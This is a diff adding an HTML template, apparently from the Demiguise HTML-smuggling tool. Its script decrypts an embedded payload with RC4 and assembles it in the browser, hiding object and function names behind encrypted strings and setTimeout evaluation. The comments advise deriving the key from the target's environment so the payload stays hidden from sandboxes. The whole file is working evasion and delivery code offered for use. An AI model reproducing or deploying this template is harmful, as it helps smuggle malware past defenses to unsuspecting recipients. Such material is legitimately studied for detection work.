@@ -1,0 +1,18 @@
+<html>
+<body>
+<script>
+function {5}(r,o){{for(var t,e=[],n=0,a="",f=0;f<256;f++)e[f]=f;for(f=0;f<256;f++)n=(n+e[f]+r.charCodeAt(f%r.length))%256,t=e[f],e[f]=e[n],e[n]=t;f=0,n=0;for(var h=0;h<o.length;h++)n=(n+e[f=(f+1)%256])%256,t=e[f],e[f]=e[n],e[n]=t,a+=String.fromCharCode(o.charCodeAt(h)^e[(e[f]+e[n])%256]);return a}}
+
+// you need to insert your own key environmental derivation function below. It must store the key in the variable called: {0}
+// By default demiguise will just use your key straight up. Instead you should derive your key from the environment
+// so that it only works on your intended target (and not in a sandbox). See virginkey.js for an example.
+var {0} = function(){{return "{6}"}};
+
+var {1} = "{2}";
+var {9} = {5}({0}(),atob("{10}"));
+setTimeout('var {3} = new '+{9}+'([{5}({0}(), atob({1}))])');
+var {8} = {5}({0}(),atob("{7}"));
+setTimeout({8}+'({3}, {5}({0}(), atob("{4}")))');
+</script>
+</body>
+</html>
